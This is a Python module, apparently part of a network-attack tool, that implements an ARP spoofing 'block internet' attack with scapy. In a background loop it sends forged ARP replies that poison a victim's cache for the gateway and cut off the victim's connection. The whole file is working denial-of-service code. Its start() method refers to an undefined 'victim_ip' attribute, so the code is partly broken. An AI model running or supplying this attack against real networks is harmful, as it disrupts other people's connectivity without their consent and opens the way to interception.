#!/usr/bin/env python3

"""
ARP Spoofing Strategy Module
-----------------

This module implements the ARP spoofing attack strategy.
It inherits from the `AttackStrategy` base class and provides
methods to start and stop the ARP spoofing attack.
"""

import threading
import time

from scapy.all import ARP, send
from .strategy import AttackStrategy

class BlockInternetStrategy(AttackStrategy):
    def __init__(self, target_ip: str, gateway_ip: str, target_mac: str, gateway_mac: str, logger):
        """
        Initializes the ARP spoofing strategy with target and gateway IPs.
        
        :param target_ip: The IP address of the target machine.
        :param gateway_ip: The IP address of the gateway.
        :param target_mac: The MAC address of the target machine.
        :param gateway_mac: The MAC address of the gateway.
        :param logger: An instance of a logger to log messages.
        """
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.target_mac = target_mac
        self.gateway_mac = gateway_mac
        self.logger = logger
        self._running = False
        self._thread = None

    def _block_loop(self) -> None:
        """
        Internal method to continuously send ARP spoofing packets.
        This method runs in a separate thread to avoid blocking the main thread.
        It sends ARP replies to the target machine, pretending to be the gateway.
        """
        while self._running:
            # Poison only the victim's ARP cache for gateway
            send(ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip), 
                 verbose=False)
            
            time.sleep(2)

    def start(self) -> None:
        """
        Starts the ARP spoofing attack by sending ARP replies to the target machine.
        This method creates a new thread to run the `_block_loop` method,
        allowing the attack to run in the background without blocking the main thread.
        """
        if self._running:
            self.logger.log("[!] Attack is already running.")
            return
        
        self._running = True
        self._thread = threading.Thread(target=self._block_loop, daemon=True)
        self._thread.start()
        self.logger.log(f"[!] Internet blocked for {self.victim_ip}")

    def stop(self) -> None:
        """
        Stops the ARP spoofing attack by terminating the background thread.
        This method sets the `_running` flag to False and waits for the thread to finish.
        """
        self._running = False

        if self._thread:
            self._thread.join(timeout=1)

        self.logger.log(f"[!] Internet unblocked for {self.target_ip}")

